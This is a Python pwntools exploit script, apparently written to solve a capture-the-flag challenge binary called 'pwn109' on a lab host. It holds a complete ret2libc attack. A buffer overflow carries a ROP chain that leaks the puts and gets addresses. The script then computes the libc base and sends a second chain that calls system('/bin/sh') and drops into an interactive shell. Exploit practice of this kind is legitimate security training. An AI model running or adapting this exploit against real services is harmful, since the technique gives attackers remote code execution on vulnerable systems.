#!/usr/bin/python3
from pwn import *
import string

context.binary = elf = ELF("./pwn109-1644300507645.pwn109", checksec = False)
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so", checksec = False)
#con = process()
#gdb.attach(con, gdbscript = "start")
con = remote("10.10.41.162", 9009)

ret = 0x0000000000401231
poprdi = 0x00000000004012a3

con.recvuntil("\xf0\x9f\x98\x8f\x0a")

payload = b"A"*0x28 + p64(poprdi) + p64(elf.got['puts']) + p64(ret) + p64(elf.plt['puts']) + p64(poprdi) + p64(elf.got['gets']) + p64(ret) + p64(elf.plt['puts']) + p64(elf.sym['main'])

input()
con.sendline(payload)

leak = u64(con.recv(6) + b"\0\0")
log.info("puts leak: " + hex(leak))
con.recv(1)
leak2 = u64(con.recv(6) + b"\0\0")
log.info("gets leak: " + hex(leak2))
libc.address = leak - libc.sym['puts']
log.info("libc base: " + hex(libc.address))

payload = b"A"*0x28 + p64(poprdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym['system']) 

input()
con.sendline(payload)

con.interactive()
